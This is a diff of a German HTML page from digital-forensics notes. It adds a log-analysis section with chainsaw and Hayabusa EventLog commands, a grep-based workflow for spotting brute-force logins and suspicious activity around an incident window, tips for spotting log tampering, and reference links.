+<h3>Tool: chainsaw (Sigma-Rules auf EventLogs)</h3>
+<pre><code># EventLog-Datei mit Sigma-Regeln scannen
+chainsaw hunt /mnt/evidence/Windows/System32/winevt/Logs/ -s sigma/rules/ --mapping mappings/sigma-event-logs-all.yml</code></pre>
+
+<h3>Tool: Hayabusa (EventLog Timeline)</h3>
+<pre><code># Windows EventLog Timeline mit Hayabusa generieren
+hayabusa.exe csv-timeline -d C:\evidence\Windows\System32\winevt\Logs\ -o timeline.csv</code></pre>
+
+<h3>Vollständiger Log-Analyse-Workflow</h3>
+
+<pre><code># 1. Zeitzone des loggenden Systems ermitteln
+cat /etc/timezone                    # Linux
+tzutil /g                            # Windows
+# → Dokumentiere: Welche TZ war zur Tatzeit aktiv?
+
+# 2. Zeitfenster eingrenzen
+# Tatzeit: 15.03.2025 01:00 - 04:00 UTC
+grep "Mar 15 0[1-4]:" auth.log > auth_tatzeit.txt
+
+# 3. Brute-Force-Check
+grep "Failed password" auth_tatzeit.txt | \
+  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
+
+# 4. Erfolgreiche Logins im Zeitfenster
+grep "Accepted" auth_tatzeit.txt
+
+# 5. Sudo/Su-Nutzung nach Login
+grep "sudo:" auth_tatzeit.txt
+grep "su:" auth_tatzeit.txt
+
+# 6. Web-Logs auf Angriffe scannen
+grep -E " 50[0-9] " access.log | awk '{print $1, $4, $7}'
+
+# 7. Korrelation: Firewall-Log + Server-Log
+# FW: "ACCEPT src=10.0.0.42 dst=10.0.0.100 dport=443"
+# Web: "10.0.0.42 ... POST /upload.php ... 200"
+# → Daten wurden erfolgreich exfiltriert</code></pre>
+
+<div class="callout tip"><strong>Praxis-Tipp:</strong> Verwende immer <code>sort | uniq -c | sort -rn</code> als erste Triage. Die größten Ausreißer (die am häufigsten vorkommenden IPs, URLs, User-Agents) zeigen dir sofort, wo du tiefer graben musst. 90 % der Log-Analyse ist Zählen und Sortieren.</div>
+
+<div class="callout warning"><strong>Log-Integrität:</strong> Logs können manipuliert sein. Achte auf: Lücken in der Timeline (fehlende Stunden/Tage), inkonsistente PID-Sequenzen, Log-Rotation mitten im Angriffszeitraum, fehlende <code>session closed</code>-Einträge nach <code>session opened</code>. All das sind Hinweise auf Log-Wiping.</div>
 
 <h2 id="quellen-weiterf-hrendes">Quellen / Weiterführendes</h2>
 
-<ul><li><a href="https://www.sans.org/security-resources/posters/dfir/20">SANS: Logging and Monitoring Cheat Sheet</a></li></ul>
+<ul>
+  <li><a href="https://www.sans.org/security-resources/posters/dfir/20">SANS: Logging and Monitoring Cheat Sheet</a></li>
+  <li><a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/">Ultimate Windows Security: Event ID Encyclopedia</a></li>
+  <li><a href="https://lnav.org/">lnav — The Log Navigator</a></li>
+  <li><a href="https://github.com/Yamato-Security/hayabusa">Hayabusa — Windows Event Log Timeline Generator</a></li>
+  <li><a href="https://github.com/WithSecureLabs/chainsaw">Chainsaw — Sigma Rule Detection</a></li>
+  <li>NIST SP 800-92: Guide to Computer Security Log Management</li>
+</ul>
 
 </article>
 </main>
+<nav class="prev-next" id="prevNextNav"></nav>
+<footer class="page-footer">
+  <a href="https://github.com/NicCsn/digital-forensics-notes">GitHub</a> &middot; <a href="../00-meta/glossary.html">Glossar</a> &middot; <a href="../INDEX.html">Index</a>
+</footer>
+</div>
+<button id="back-to-top" title="Nach oben">↑</button>
+<script src="../nav-order.js"></script>
+<script src="../search.js"></script>
+<script>
+(function(){
+  var btn = document.getElementById('back-to-top');
+  if (!btn) return;
+  window.addEventListener('scroll', function() {
+    btn.classList.toggle('show', window.scrollY > 400);
+  });
+  btn.addEventListener('click', function() {
+    window.scrollTo({top: 0, behavior: 'smooth'});
+  });
+})();
+</script>
 </body>
 </html>
